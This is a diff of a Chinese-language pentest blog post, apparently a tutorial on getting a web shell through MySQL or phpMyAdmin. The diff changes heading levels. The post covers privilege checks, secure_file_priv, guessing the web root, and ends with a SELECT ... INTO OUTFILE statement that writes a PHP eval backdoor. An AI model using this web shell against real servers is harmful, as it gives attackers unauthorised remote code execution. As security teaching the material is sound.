@@ -24,12 +24,12 @@ mysql:mysql
 (2) 知道web绝对路径  
 (3) web路径能写 secrue\_file\_priv不被设置
 
-###### [](#2-2-1-权限查看 "2.2.1 权限查看")2.2.1 权限查看
+#### [](#2-2-1-权限查看 "2.2.1 权限查看")2.2.1 权限查看
 
 权限可以看看phpmyadmin的一些权限控制  
 ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113172639.png)
 
-###### [](#2-2-2变量查看 "2.2.2变量查看")2.2.2变量查看
+#### [](#2-2-2变量查看 "2.2.2变量查看")2.2.2变量查看
 
 ```sql
 show variables like '%secure%';
@@ -38,7 +38,7 @@ show variables like '%secure%';
 如果secure\_file\_priv没有任何设置,则我们可以写马但是如果设置了对应的文件，我们就无法写入  
 ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20250113173133.png)
 
-###### [](#2-2-3-网站路径 "2.2.3 网站路径")2.2.3 网站路径
+#### [](#2-2-3-网站路径 "2.2.3 网站路径")2.2.3 网站路径
 
 1.  phpinfo
 
@@ -55,7 +55,7 @@ C:/phpStudy/WWW
 利用数据库路径去爆破猜测
 
 ```sql
-# 这是数据库的路径条件依照这个猜测网站根目录 show variables like '%datadir%'; 
+## 这是数据库的路径条件依照这个猜测网站根目录 show variables like '%datadir%'; 
 ```
 
 利用sql语句去猜测爆破
@@ -65,7 +65,7 @@ C:/phpStudy/WWW
 
 ```
 
-###### [](#2-2-4-shell写入 "2.2.4 shell写入")2.2.4 shell写入
+#### [](#2-2-4-shell写入 "2.2.4 shell写入")2.2.4 shell写入
 
 ```sql
 select '<?php echo 1;@eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/WWW/shell.php';
